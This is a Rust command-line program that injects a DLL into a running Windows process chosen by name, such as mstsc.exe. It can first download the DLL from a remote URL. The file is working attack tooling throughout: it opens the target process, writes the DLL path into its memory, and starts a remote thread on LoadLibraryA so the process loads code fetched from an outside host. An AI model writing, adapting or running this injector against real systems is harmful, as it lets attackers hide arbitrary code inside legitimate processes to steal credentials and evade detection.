use std::{ptr, os::raw::c_void, env, path::PathBuf, fs::File, io::Write, process::exit};

use clap::Parser;
use reqwest::blocking::Response;
use sysinfo::System;
use windows::Win32::{Foundation::{CloseHandle, GetLastError, FARPROC, HANDLE, HMODULE, WIN32_ERROR}, System::{Diagnostics::Debug::WriteProcessMemory, LibraryLoader::{GetModuleHandleA, GetProcAddress}, Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ}, Threading::{CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE}}};
use windows_strings::s;

fn get_process(p_name: &String) -> u32 {
    let mut sys = System::new_all();
    sys.refresh_all();

    let mut pid: u32 = 0;
    for (proc_id, process) in sys.processes() {
        if process.name().to_str().unwrap().to_lowercase() == p_name.to_lowercase() {
           pid = proc_id.as_u32();
           break;
        }
    }

    return pid;
}

fn get_path(url: &String, l_file: &String) -> String {
    if !l_file.is_empty() {
        return l_file.to_string();
    }

    println!("[+] Downloading DLL");
    let resp: Response = reqwest::blocking::get(url).unwrap();
    if !resp.status().is_success() {
        println!("[!] Error fetching DLL!");
        exit(1);
    }
    let file_bytes: Vec<u8> = resp.bytes().unwrap().to_vec();

    let mut f_path: PathBuf = env::temp_dir();
    let filename: Vec<&str> = url.rsplit("/").collect();
    f_path.push(filename[0]);
    let mut f: File = File::create(&f_path).unwrap();
    f.write_all(&file_bytes).expect("Error writing data to file");

    return f_path.display().to_string();
}


/// Takes a remote or local DLL and injects it into a target process.
#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// URL to remote dll file
    #[arg(short, long, default_value_t = String::new())]
    url: String,

    /// Path to local DLL.
    #[arg(short, long, default_value_t = String::new())]
    local: String,

    /// Process name to inject into. e.g., mstsc.exe
    #[arg(short, long, default_value_t = String::new())]
    process: String,
}

fn main() {
    let args: Args = Args::parse();
    
    let url: String = args.url;
    let p_name: String = args.process;
    let l_path: String = args.local;

    if url.is_empty() && l_path.is_empty() {
        println!("[!] Must pass either url or local path");
        exit(1);
    }

    println!("[+] Finding process");
    let pid: u32 = get_process(&p_name);
    if pid == 0 {
        println!("[!] Process not found!");
        exit(1);
    }
    println!("[+] Found pid! {}", pid);

    let mut dll_path: String = get_path(&url, &l_path);
    let p_len: usize = dll_path.len();
    println!("[+] DLL path: {dll_path}");
    let dll_path_bytes: &mut [u8] = unsafe { dll_path.as_bytes_mut() };

    unsafe {
        println!("[+] Opening handle to process");
        let h_proc: HANDLE = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            false,
            pid).unwrap();

        println!("[+] Allocating memory");
        let exec_mem: *mut c_void = VirtualAllocEx(
            h_proc,
            Some(ptr::null_mut()),
            p_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READ
        );

        let mut out_bytes: usize = 0;
        println!("[+] Copying dll path into memory");
        if !WriteProcessMemory(
            h_proc,
            exec_mem,
            dll_path_bytes.as_mut_ptr() as *mut c_void,
            p_len,
            Some(&mut out_bytes)
        ).is_ok() {
            let e: WIN32_ERROR = GetLastError();
            panic!("[!] Error copying bytes {:?}", e);
        }

        println!("[+] Getting address of LoadLibraryA");
        let hinst: HMODULE = GetModuleHandleA(s!("kernel32.dll")).unwrap();
        let lib_addr: FARPROC = GetProcAddress(hinst, s!("LoadLibraryA"));
        println!("[+] Injecting DLL");
        let la: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(lib_addr) };
        CreateRemoteThread(
            h_proc,
            Some(ptr::null_mut()),
            0,
            Some(la),
            Some(exec_mem),
            0,
            Some(ptr::null_mut())
        ).unwrap();
        CloseHandle(h_proc).unwrap();
    }
}

